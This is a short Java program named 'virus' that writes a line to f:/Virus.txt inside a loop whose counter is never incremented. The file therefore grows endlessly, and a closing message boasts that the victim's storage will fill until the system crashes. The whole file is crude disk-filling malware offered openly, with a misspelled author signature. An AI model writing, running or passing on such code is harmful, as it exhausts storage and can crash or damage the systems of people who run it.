import java.io.*;
class virus
{
	public static void main(String args[])
	{
		FileWriter fw;
		BufferedWriter bw;
		try{
				fw= new FileWriter("f:/Virus.txt");
				bw= new BufferedWriter(fw);
				int j=0;
				while(j<10){
					bw.write("The vius was created by The Great Manoj on 4-12-2020...");
				}
				bw.close();
		}
		catch(IOException e)
		{
			System.out.println(e);
		}
		System.out.println("Have a wonderful day as your system gets filled with text"+ 
			" documents over and over until your storage is full and your system crashes!");
	}
}